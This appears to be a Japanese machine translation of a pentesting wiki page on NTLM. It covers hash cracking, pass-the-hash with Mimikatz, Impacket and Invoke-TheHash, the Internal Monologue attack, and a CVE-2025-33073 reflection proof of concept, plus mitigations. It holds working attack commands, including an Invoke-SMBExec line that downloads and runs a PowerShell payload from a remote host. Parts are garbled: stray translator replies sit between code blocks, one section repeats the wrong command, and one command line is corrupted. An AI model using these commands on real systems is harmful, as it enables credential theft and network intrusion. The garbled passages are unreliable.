# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

**Windows XP および Server 2003** が稼働している環境では、LM（Lan Manager）hashes が使用されますが、これらが容易に侵害可能であることは広く知られています。特定の LM hash である `AAD3B435B51404EEAAD3B435B51404EE` は、LM が使用されていないことを示しており、空の文字列に対する hash を表します。

デフォルトでは、**Kerberos** authentication protocol が主な方法として使用されます。NTLM（NT LAN Manager）は、Active Directory が存在しない場合、domain が存在しない場合、設定不備によって Kerberos が機能しない場合、または有効な hostname ではなく IP address を使用して接続を試みる場合など、特定の状況で使用されます。

ネットワーク packet に **"NTLMSSP"** header が存在する場合、NTLM authentication process が行われていることを示します。

authentication protocols - LM、NTLMv1、NTLMv2 - のサポートは、`%windir%\Windows\System32\msv1\_0.dll` にある特定の DLL によって提供されます。

**主なポイント**:

- LM hashes は脆弱であり、空の LM hash（`AAD3B435B51404EEAAD3B435B51404EE`）は LM が使用されていないことを示します。
- Kerberos はデフォルトの authentication method であり、NTLM は特定の条件下でのみ使用されます。
- NTLM authentication packets は、"NTLMSSP" header によって識別できます。
- LM、NTLMv1、NTLMv2 protocols は、system file `msv1\_0.dll` によってサポートされます。

## LM、NTLMv1、NTLMv2

使用される protocol を確認および設定できます。

### GUI

_ secpol.msc _ を実行 -> Local policies -> Security Options -> Network Security: LAN Manager authentication level。level は 0 から 5 までの 6 段階です。

![LM、NTLMv1、NTLMv2 - GUI: secpol.msc を実行 - Local policies - Security Options - Network Security: LAN Manager authentication level。level は 0 から 5 までの 6 段階です](<../../images/image (919).png>)

### Registry

これにより level 5 が設定されます。
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能な値:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## NTLM ドメイン認証の基本スキーム

1. **user** が自身の **credentials** を入力する
2. クライアントマシンが **domain name** と **username** を送信して **authentication request** を送る
3. **server** が **challenge** を送信する
4. **client** がパスワードの hash を key として **challenge** を暗号化し、response として送信する
5. **server** が **domain name、username、challenge、response** を **Domain controller** に送信する。**Active Directory** が設定されていない場合、または domain name が server の名前である場合、credentials は **locally** **checked** される。
6. **domain controller** がすべて正しいか **checks** し、情報を server に送信する

**server** と **Domain Controller** は **Netlogon** server 経由で **Secure Channel** を作成できる。これは Domain Controller が server のパスワードを把握しているためである（パスワードは **NTDS.DIT** db 内に存在する）。

### Local NTLM authentication Scheme

認証は上記のものと同じだが、**server** は **SAM** file 内に、認証を試みている **user** の hash を保持している。そのため、**Domain Controller** に問い合わせる代わりに、**server** 自身が user が authenticate できるかを **check** する。

### NTLMv1 Challenge

**challenge の長さは 8 bytes** で、**response** の長さは 24 bytes である。

**NT hash（16bytes）** は **7bytes ずつの 3 parts**（7B + 7B + (2B+0x00\*5)）に分割される。**最後の part は zeros で埋められる**。その後、**challenge** は各 part で個別に **ciphered** され、**resulting ciphered bytes** が連結される。合計：8B + 8B + 8B = 24Bytes。

**Problems**:

- **randomness** の欠如
- 3 つの parts を個別に **attacked** して NT hash を見つけられる
- **DES is crackable**
- 3 番目の key は常に **5 zeros** で構成される
- 同じ **challenge** が与えられた場合、**response** も同じになる。そのため、victim に "**1122334455667788**" という文字列を **challenge** として与え、**precomputed rainbow tables** を使用して response を attack できる

### NTLMv1 attack

Unconstrained delegation は modern environments ではあまり一般的ではないが、到達可能な **Print Spooler service** を悪用して、そのような host への authentication を強制できる可能性がある。

AD 上ですでに保有している credentials/sessions の一部を悪用して、printer に **host under your control** への **authenticate** を要求させることができる。その後、`metasploit auxiliary/server/capture/smb` または `responder` を使用して **authentication challenge を 1122334455667788 に設定**し、authentication attempt を capture する。NTLMv1 を使用して行われた場合は、これを **crack** できる。\
`responder` を使用している場合は、authentication を **downgrade** するために **flag `--lm` を使用**してみることができる。\
_この technique では、authentication が NTLMv1 を使用して実行される必要がある（NTLMv2 は valid ではない）。_

printer は authentication 中に computer account を使用することに注意すること。また、computer accounts は **long and random passwords** を使用するため、一般的な **dictionaries** を使って **crack** することはおそらくできない。しかし、**NTLMv1** authentication は **DES**（[more info here](#ntlmv1-challenge)）を使用するため、DES の cracking 専用に設計された services を使えば crack できる（例えば [https://crack.sh/](https://crack.sh) または [https://ntlmv1.com/](https://ntlmv1.com) を使用できる）。

### NTLMv1 attack with hashcat

NTLMv1 は [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) を使用しても attack できる。この tool は capture した NTLMv1 messages を Hashcat に適した formats に変換する。<sup>[[1]](#references)</sup>

コマンド
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
翻訳する本文がありません。翻訳対象のMarkdownを送ってください。
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
翻訳する内容を送ってください。
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcatを実行します（分散実行にはhashtopolisのようなツールを使うのが最適です）。そうしないと数日かかります。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
この場合、パスワードが password だと分かっているので、デモ目的でチートします。
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
ここでは、hashcat-utilitiesを使用して、crack済みのdesキーをNTLM hashの一部に変換する必要があります。
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
翻訳する本文がありません。最後の部分を貼り付けてください。
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
翻訳する本文を貼り付けてください。
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge lengthは8 bytes**で、**2つのresponseが送信されます**: 1つは**24 bytes**で、**もう1つの長さは可変**です。

**最初のresponse**は、**clientとdomain**で構成される**string**を**HMAC_MD5**でcipherし、**key**として**NT hash**の**MD4 hash**を使用して作成されます。次に、**その結果**を**key**として使用し、**challenge**を**HMAC_MD5**でcipherします。これに**8 bytesのclient challenge**が追加されます。合計: 24 B。

**2つ目のresponse**は、**複数の値**（新しいclient challenge、**replay attacks**を防止するための**timestamp**など）を使用して作成されます。

**successful authentication exchangeを含むPCAP**がある場合は、domain、username、server challenge、NTLMv2 responseを抽出し、captureをHashcat用にformatして、mode `5600`でpassword recoveryを試行します。アーカイブされた実践 walkthroughにはpacket-field extractionの手順が残されており、Hashcatのexamplesでは現在受け入れられているformatが定義されています。<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**victimのhashを取得したら**、それを使用して**victimになりすます**ことができます。\
その**hashを使用してNTLM authenticationを実行する****tool**を使用する必要があります。あるいは、新しい**sessionlogon**を作成して、その**hash**を**LSASS**内に**inject**することもできます。これにより、**NTLM authenticationが実行されるたびに、そのhashが使用されます。**最後の方法を実行するのがmimikatzです。

**Computer accountsを使用してPass-the-Hash attacksも実行できることを忘れないでください。**

### **Mimikatz**

**administratorとして実行する必要があります**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
これは現在のローカルユーザーとしてプロセスを起動し、LSASS は指定された認証情報をアウトバウンドネットワークログオンに関連付けます。その後、平文パスワードを知らなくても、`runas /netonly` と同様に、指定されたユーザーとしてネットワークリソースにアクセスできます。

### Linux からの Pass-the-Hash

Linux から Pass-the-Hash を使用して、Windows マシン上でコード実行を取得できます。\
[**実用的な Pass-the-Hash 実行例を参照してください。**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket の Windows コンパイル済みツール

[ここから Impacket の Windows バイナリをダウンロードできます](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** （この場合、コマンドを指定する必要があります。cmd.exe と powershell.exe はインタラクティブシェルを取得する用途には使用できません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Impacket のバイナリは他にもいくつかあります...

### Invoke-TheHash

PowerShell スクリプトはここから取得できます：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

この関数は、前述のモードを組み合わせます。**複数のホスト**を渡したり、選択したターゲットを除外したり、_SMBExec、WMIExec、SMBClient、_または _SMBEnum_ を選択したりできます。_**Command**_ パラメーターなしで **SMBExec** または **WMIExec** を選択した場合、十分な権限があるかどうかのみを確認します。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールは mimikatz と同じ処理を行います（LSASS メモリを変更します）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### username と password を使用した Windows remote execution の手動実行


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host からの credentials の抽出

詳細については、[**Stealing Windows Credentials**](../stealing-credentials/README.md) を参照してください。

## Internal Monologue attack

Internal Monologue Attack は、**LSASS process と直接やり取りすることなく**、被害者の machine から NTLM hashes を取得できる stealthy な credential extraction technique です。memory から hashes を直接読み取り、endpoint security solutions や Credential Guard によって頻繁にブロックされる Mimikatz とは異なり、この attack は **Security Support Provider Interface (SSPI) 経由で NTLM authentication package (MSV1_0) への local calls を利用します**。まず attacker は **NTLM settings**（例: LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic）を **downgrade** し、NetNTLMv1 が許可されるようにします。次に、running processes から取得した既存の user tokens を impersonate し、locally NTLM authentication を trigger して、既知の challenge を使用した NetNTLMv1 responses を生成します。<sup>[[4]](#references)</sup>

これらの NetNTLMv1 responses を capture した後、attacker は **precomputed rainbow tables** を使用して元の NTLM hashes を迅速に復元でき、lateral movement のためのさらなる Pass-the-Hash attacks が可能になります。重要なのは、Internal Monologue Attack が network traffic を生成せず、code injection や直接的な memory dumps も trigger しないため、stealthy な点です。そのため、Mimikatz のような従来の methods と比較して defenders による検出が困難です。

NetNTLMv1 が強制された security policies により受け入れられない場合、attacker は NetNTLMv1 response の取得に失敗する可能性があります。

このケースに対応するため、Internal Monologue tool は更新されました。`AcceptSecurityContext()` を使用して server token を動的に取得し、NetNTLMv1 が失敗した場合でも **NetNTLMv2 responses を capture** できるようになっています。NetNTLMv2 は crack がはるかに困難ですが、relay attacks や、限定的なケースでは offline brute-force への道を開く可能性があります。

PoC は **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** にあります。<sup>[[4]](#references)</sup>

## NTLM Relay と Responder

**これらの attacks の実行方法については、こちらのより詳細な guide を参照してください:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## network capture から NTLM challenges を parse する

**以下を使用できます:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPNs 経由の NTLM と Kerberos の *Reflection* (CVE-2025-33073)

Windows には、host から発生した NTLM（または Kerberos）authentication を **同じ** host に relay して SYSTEM privileges を取得する *reflection* attacks を防止しようとする複数の mitigations が含まれています。

Microsoft は MS08-068 (SMB→SMB)、MS09-013 (HTTP→SMB)、MS15-076 (DCOM→DCOM) およびその後の patches によって、public chains の大部分を破りました。しかし、**CVE-2025-33073** は、*marshalled* (serialized) target-info を含む **SMB client が Service Principal Names (SPNs) を truncate する方法を悪用することで、これらの protections を bypass できる可能性があることを示しています**。<sup>[[5]](#references)[[6]](#references)</sup>

### バグの TL;DR
1. attacker は、marshalled SPN を encode した label を持つ **DNS A-record** を register します（例:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`）
2. victim は、その hostname に authenticate するよう coercion されます（PetitPotam、DFSCoerce など）。
3. SMB client が target string `cifs/srv11UWhRCAAAAA…` を `lsasrv!LsapCheckMarshalledTargetInfo` に渡すと、`CredUnmarshalTargetInfo` の call により **serialized blob が strip** され、**`cifs/srv1`** が残ります。
4. これにより、`msv1_0!SspIsTargetLocalhost`（または Kerberos equivalent）は、short host part が computer name (`SRV1`) と一致するため、target を *localhost* とみなします。
5. その結果、server は `NTLMSSP_NEGOTIATE_LOCAL_CALL` を set し、**LSASS の SYSTEM access-token** を context に inject します（Kerberos では SYSTEM-marked subsession key が作成されます）。
6. `ntlmrelayx.py` **または** `krbrelayx.py` でその authentication を relay すると、同じ host 上で完全な SYSTEM rights が得られます。<sup>[[5]](#references)</sup>

### 簡易 PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* **CVE-2025-33073** の KB patch は、`mrxsmb.sys::SmbCeCreateSrvCall` にチェックを追加し、marshalled info を含むターゲット（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）への SMB connection をブロックします。<sup>[[5]](#references)[[6]](#references)</sup>
* パッチ未適用のホストでも reflection を防ぐため、**SMB signing** を強制します。
* `*<base64>...*` に類似する DNS records を監視し、coercion vectors（PetitPotam、DFSCoerce、AuthIP...）をブロックします。

### Detection ideas
* client IP ≠ server IP の `NTLMSSP_NEGOTIATE_LOCAL_CALL` を含む network captures。
* subsession key と hostname と同じ client principal を含む Kerberos AP-REQ。
* Windows Event 4624/4648 の SYSTEM logons の直後に、同じホストからの remote SMB writes が発生している場合。<sup>[[5]](#references)</sup>

**2026年3月** の local reflection variant では、**SMB arbitrary ports** と **TCP connection reuse** を悪用して `NT AUTHORITY\SYSTEM` に到達します。詳細は以下を参照してください。

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS に触れずに NTLM Hashes を取得する方法](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection は死んだ、NTLM Reflection 万歳！](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 Hash の Cracking – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
